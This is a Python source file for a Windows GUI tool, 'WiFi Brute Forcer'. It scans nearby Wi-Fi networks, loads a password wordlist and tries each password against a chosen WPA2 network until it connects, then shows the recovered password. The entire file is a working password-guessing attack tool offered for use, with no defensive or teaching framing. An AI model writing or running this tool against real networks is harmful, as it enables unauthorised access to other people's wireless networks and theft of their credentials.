import threading
import time
import tkinter as tk
from tkinter import filedialog, messagebox, ttk

try:
    import pywifi
    from pywifi import const
except ImportError:
    raise ImportError("pywifi is required on Windows. Install with 'pip install pywifi'")

# Dark theme colors
BG_COLOR       = "#2e2e2e"
FG_COLOR       = "#ffffff"
BTN_BG         = "#444444"
BTN_ACTIVE_BG  = "#555555"
ENTRY_BG       = "#3e3e3e"
LISTBOX_BG     = "#3e3e3e"
SELECT_BG      = "#555555"

class WifiBruteForcer:
    def __init__(self, master):
        self.master = master
        master.title("WiFi Brute Forcer (Windows)")
        master.geometry("520x600")
        master.configure(bg=BG_COLOR)

        # Hidden SSID toggle
        self.hidden_var = tk.BooleanVar()
        hidden_frame = tk.Frame(master, bg=BG_COLOR)
        tk.Checkbutton(
            hidden_frame, text="Hidden SSID", variable=self.hidden_var,
            command=self._toggle_hidden, bg=BG_COLOR, fg=FG_COLOR,
            selectcolor=BG_COLOR, activebackground=BG_COLOR, activeforeground=FG_COLOR
        ).pack(side=tk.LEFT)
        tk.Label(hidden_frame, text="Manual SSID:", bg=BG_COLOR, fg=FG_COLOR)\
          .pack(side=tk.LEFT, padx=(10,0))
        self.ssid_entry = tk.Entry(
            hidden_frame, width=30, state=tk.DISABLED,
            bg=ENTRY_BG, fg=FG_COLOR, insertbackground=FG_COLOR
        )
        self.ssid_entry.pack(side=tk.LEFT)
        hidden_frame.pack(pady=5)

        # Scan and list
        self.scan_btn = tk.Button(
            master, text="Scan Networks", command=self.scan_networks,
            bg=BTN_BG, fg=FG_COLOR, activebackground=BTN_ACTIVE_BG, activeforeground=FG_COLOR
        )
        self.scan_btn.pack(pady=5)

        self.network_listbox = tk.Listbox(
            master, selectmode=tk.SINGLE, width=60, height=8,
            bg=LISTBOX_BG, fg=FG_COLOR, selectbackground=SELECT_BG, selectforeground=FG_COLOR
        )
        self.network_listbox.pack(pady=5)

        # Dictionary load
        self.load_dict_btn = tk.Button(
            master, text="Load Dictionary", command=self.load_dictionary,
            bg=BTN_BG, fg=FG_COLOR, activebackground=BTN_ACTIVE_BG, activeforeground=FG_COLOR
        )
        self.load_dict_btn.pack(pady=5)

        self.dict_label = tk.Label(master, text="No dictionary loaded", bg=BG_COLOR, fg=FG_COLOR)
        self.dict_label.pack(pady=5)

        # Start button
        self.start_btn = tk.Button(
            master, text="Start Brute Force", command=self.start_bruteforce,
            bg=BTN_BG, fg=FG_COLOR, activebackground=BTN_ACTIVE_BG, activeforeground=FG_COLOR
        )
        self.start_btn.pack(pady=10)

        # Progress bar + ETA
        self.progress = ttk.Progressbar(master, length=400, maximum=100)
        self.progress.pack(pady=(10,2))
        self.eta_label = tk.Label(master, text="ETA: 0s", bg=BG_COLOR, fg=FG_COLOR)
        self.eta_label.pack()

        # Control buttons
        btn_frame = tk.Frame(master, bg=BG_COLOR)
        self.pause_btn = tk.Button(
            btn_frame, text="Pause", command=self._pause,
            bg=BTN_BG, fg=FG_COLOR, activebackground=BTN_ACTIVE_BG
        )
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        self.resume_btn = tk.Button(
            btn_frame, text="Resume", command=self._resume, state=tk.DISABLED,
            bg=BTN_BG, fg=FG_COLOR, activebackground=BTN_ACTIVE_BG
        )
        self.resume_btn.pack(side=tk.LEFT, padx=5)
        self.cancel_btn = tk.Button(
            btn_frame, text="Cancel", command=self._cancel, state=tk.DISABLED,
            bg=BTN_BG, fg=FG_COLOR, activebackground=BTN_ACTIVE_BG
        )
        self.cancel_btn.pack(side=tk.LEFT, padx=5)
        btn_frame.pack(pady=(5,10))

        # Status label
        self.status_label = tk.Label(master, text="Status: Idle", bg=BG_COLOR, fg=FG_COLOR)
        self.status_label.pack(pady=5)

        # Internal state
        wifi = pywifi.PyWiFi()
        self.iface       = wifi.interfaces()[0]
        self.networks    = []
        self.dictionary  = []
        self._pause_event  = threading.Event()
        self._cancel_event = threading.Event()

    def _toggle_hidden(self):
        if self.hidden_var.get():
            self.ssid_entry.config(state=tk.NORMAL)
            self.scan_btn.config(state=tk.DISABLED)
            self.network_listbox.config(state=tk.DISABLED)
        else:
            self.ssid_entry.delete(0, tk.END)
            self.ssid_entry.config(state=tk.DISABLED)
            self.scan_btn.config(state=tk.NORMAL)
            self.network_listbox.config(state=tk.NORMAL)

    def scan_networks(self):
        self.network_listbox.delete(0, tk.END)
        self.status_label.config(text="Status: Scanning...")
        try:
            self.iface.scan()
            time.sleep(2)
            results = self.iface.scan_results()
            ssids = sorted({net.ssid for net in results if net.ssid})
            self.networks = ssids
            for ssid in ssids:
                self.network_listbox.insert(tk.END, ssid)
            self.status_label.config(text=f"Status: Found {len(ssids)} networks")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to scan: {e}")
            self.status_label.config(text="Status: Error scanning")

    def load_dictionary(self):
        path = filedialog.askopenfilename(
            title="Select dictionary file",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
        )
        if path:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.dictionary = [line.strip() for line in f if line.strip()]
            self.dict_label.config(text=f"Dictionary: {path} ({len(self.dictionary)} entries)")

    def start_bruteforce(self):
        # reset control flags
        self._pause_event.clear()
        self._cancel_event.clear()
        self.pause_btn.config(state=tk.NORMAL)
        self.cancel_btn.config(state=tk.NORMAL)
        self.resume_btn.config(state=tk.DISABLED)

        # pick SSID
        if self.hidden_var.get():
            ssid = self.ssid_entry.get().strip()
            if not ssid:
                messagebox.showwarning("Warning", "Enter the hidden SSID first.")
                return
        else:
            sel = self.network_listbox.curselection()
            if not sel:
                messagebox.showwarning("Warning", "Please select a network to attack.")
                return
            ssid = self.networks[sel[0]]

        if not self.dictionary:
            messagebox.showwarning("Warning", "Please load a password dictionary.")
            return

        threading.Thread(target=self.bruteforce, args=(ssid,), daemon=True).start()

    def _pause(self):
        self._pause_event.set()
        self.pause_btn.config(state=tk.DISABLED)
        self.resume_btn.config(state=tk.NORMAL)
        self.status_label.config(text="Status: Paused")

    def _resume(self):
        self._pause_event.clear()
        self.pause_btn.config(state=tk.NORMAL)
        self.resume_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Status: Resuming…")

    def _cancel(self):
        self._cancel_event.set()
        self.pause_btn.config(state=tk.DISABLED)
        self.resume_btn.config(state=tk.DISABLED)
        self.cancel_btn.config(state=tk.DISABLED)
        self.status_label.config(text="Status: Cancelling…")

    def bruteforce(self, ssid):
        total = len(self.dictionary)
        start_time = time.time()

        for idx, pwd in enumerate(self.dictionary, start=1):
            # check for cancel
            if self._cancel_event.is_set():
                break

            # pause if requested
            while self._pause_event.is_set():
                time.sleep(0.2)

            # update progress & ETA
            self.progress['maximum'] = total
            self.progress['value'] = idx
            elapsed = time.time() - start_time
            rate = idx / elapsed if elapsed > 0 else 1e-6
            remaining = (total - idx) / rate
            self.eta_label.config(text=f"ETA: {int(remaining)}s")

            # attempt this password
            self.status_label.config(text=f"Trying: {pwd}")
            profile = pywifi.Profile()
            profile.ssid   = ssid
            profile.auth   = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key    = pwd

            self.iface.remove_all_network_profiles()
            tmp = self.iface.add_network_profile(profile)
            self.iface.connect(tmp)
            time.sleep(3)

            if self.iface.status() == const.IFACE_CONNECTED:
                messagebox.showinfo("Success", f"Connected! SSID: {ssid}\nPassword: {pwd}")
                self.status_label.config(text="Status: Success")
                return
            else:
                self.iface.disconnect()
                time.sleep(1)

        # handle completion or cancel
        if self._cancel_event.is_set():
            messagebox.showinfo("Cancelled", "Brute force cancelled.")
            self.status_label.config(text="Status: Cancelled")
        else:
            messagebox.showinfo("Finished", f"No password found for {ssid}.")
            self.status_label.config(text="Status: Finished")

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiBruteForcer(root)
    root.mainloop()
